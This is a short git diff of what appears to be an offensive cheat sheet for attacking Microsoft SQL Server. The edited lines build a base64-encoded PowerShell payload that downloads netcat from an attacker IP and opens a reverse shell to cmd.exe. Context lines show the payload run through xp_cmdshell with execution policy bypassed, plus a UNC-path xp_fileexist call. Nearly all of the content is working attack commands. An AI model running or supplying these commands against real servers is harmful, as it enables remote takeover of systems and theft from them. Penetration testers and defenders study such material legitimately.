@@ -86,7 +86,7 @@ EXEC master..xp_fileexist '\\<ip>\anything\'
 ```
 
 ## reverseshell
-'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
+python 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\temp\nc.exe"); c:\windows\temp\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
 ```
 exec xp_cmdshell 'powershell -exec bypass -enc <b64_payload>
 ```
